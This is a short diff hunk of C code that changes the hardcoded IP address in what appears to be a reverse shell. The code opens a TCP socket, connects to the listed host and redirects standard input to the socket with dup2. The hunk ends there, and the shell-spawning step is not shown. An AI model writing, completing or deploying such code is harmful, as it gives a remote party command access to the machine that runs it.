@@ -16,7 +16,7 @@ int main(void){
 	sockfd = socket(AF_INET,SOCK_STREAM, 0);
 	mysockaddr.sin_family = AF_INET;
 	mysockaddr.sin_port = htons(port);
-	mysockaddr.sin_addr.s_addr = inet_addr("172.22.174.36");
+	mysockaddr.sin_addr.s_addr = inet_addr("192.168.1.1");
 
 	connect(sockfd, (struct sockaddr *) &mysockaddr, sizeof(mysockaddr));
 	dup2(sockfd, 0);
